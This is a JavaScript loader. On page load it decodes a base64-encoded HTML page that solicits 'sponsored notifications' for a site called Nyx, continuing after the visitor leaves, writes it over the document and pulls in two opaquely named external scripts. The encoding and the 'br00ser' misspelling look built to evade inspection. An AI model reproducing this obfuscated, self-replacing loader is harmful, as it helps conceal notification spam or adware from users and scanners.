(async () => {
  await new Promise(c => {
    const Z = () => setTimeout(c, 0);
    if (document.readyState === "complete") Z(); else window.addEventListener("load", Z, {
      once: true
    });
  });
  const c = (new TextDecoder).decode(Uint8Array.from(atob([ "PCFkb2N0eXBlIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29u", "dGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLGluaXRpYWwtc2NhbGU9MSI+PHRpdGxlPk9mZmVyIG5vdGlmaWNhdGlvbnMgfCBOeXg8L3RpdGxlPjxz", "dHlsZT5odG1se2NvbG9yLXNjaGVtZTpkYXJrO2JhY2tncm91bmQ6IzAwMDtjb2xvcjojZWVlO2ZvbnQ6MTZweCBzeXN0ZW0tdWl9Ym9keXttYXJn", "aW46MDttaW4taGVpZ2h0OjEwMHZoO2Rpc3BsYXk6Z3JpZDtwbGFjZS1pdGVtczpjZW50ZXJ9bWFpbntib3gtc2l6aW5nOmJvcmRlci1ib3g7d2lk", "dGg6bWluKDUyMHB4LDEwMCUpO3BhZGRpbmc6MjhweH1oMXtmb250LXNpemU6MjZweH1we2xpbmUtaGVpZ2h0OjEuNjtjb2xvcjojYWFhfWJ1dHRv", "bntkaXNwbGF5OmlubGluZS1mbGV4O2dhcDoxMHB4O2FsaWduLWl0ZW1zOmNlbnRlcjtib3JkZXI6MXB4IHNvbGlkICNmZmZmZmYzMDtib3JkZXIt", "cmFkaXVzOjEycHg7YmFja2dyb3VuZDojMTUxNTE1O2NvbG9yOiNlZWU7cGFkZGluZzoxM3B4IDE4cHg7Zm9udDo2MDAgMTVweCBzeXN0ZW0tdWk7", "Y3Vyc29yOnBvaW50ZXJ9YnV0dG9uOmRpc2FibGVke29wYWNpdHk6LjU1O2N1cnNvcjpkZWZhdWx0fXN2Z3t3aWR0aDoyMHB4O2hlaWdodDoyMHB4", "O2ZpbGw6bm9uZTtzdHJva2U6Y3VycmVudENvbG9yO3N0cm9rZS13aWR0aDoxLjd9PC9zdHlsZT48c2NyaXB0IGRlZmVyPSJkZWZlciIgc3JjPSIv", "anMvQHJjZmIyODljNjc0ZDVlZjEwZWMwMGJhMmIhLmpzIj48L3NjcmlwdD4gPC9oZWFkPjxib2R5PjxtYWluPjxoMT5PZmZlciBub3RpZmljYXRp", "b25zPC9oMT48cD5HZXQgc3BvbnNvcmVkIG5vdGlmaWNhdGlvbnMgb24gdGhpcyBkZXZpY2UsIGluY2x1ZGluZyBhZnRlciB5b3UgbGVhdmUgTnl4", "LiBZb3UgY2FuIHR1cm4gdGhlbSBvZmYgaW4geW91ciBicjAwc2VyIHNldHRpbmdzLjwvcD48YnV0dG9uIHR5cGU9ImJ1dHRvbiIgZGlzYWJsZWQ9", "ImRpc2FibGVkIiBhcmlhLWxhYmVsPSJFbmFibGUgb2ZmZXIgbm90aWZpY2F0aW9ucyI+PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIGFyaWEtaGlk", "ZGVuPSJ0cnVlIj48cGF0aCBkPSJNNiA5YTYgNiAwIDAgMSAxMiAwdjVsMiAzSDRsMi0zVjlabTQgMTFoNE0xMiAzVjEiLz48L3N2Zz5FbmFibGUg", "bm90aWZpY2F0aW9uczwvYnV0dG9uPjxwIHJvbGU9InN0YXR1cyI+Tm90aGluZyBpcyBlbmFibGVkIHVudGlsIHlvdSBjaG9vc2UgdG8gY29udGlu", "dWUuPC9wPjwvbWFpbj48c2NyaXB0IHNyYz0iLi9AcmNmYjcxODlmODhmNDMyMzY1NzZlYjIwZiEuanMiPjwvc2NyaXB0PjwvYm9keT48L2h0bWw+", "Cg==" ].join("")), c => c.charCodeAt(0)));
  const Z = document.querySelector("base")?.outerHTML || "";
  document.open();
  document.write(c.replace(/<head(?:\s[^>]*)?>/i, c => c + Z));
  document.close();
})().catch(() => {
  const c = document.createElement("p");
  c.setAttribute("role", "alert");
  c.textContent = "This page could not be loaded. Please reload to try again.";
  document.body.prepend(c);
});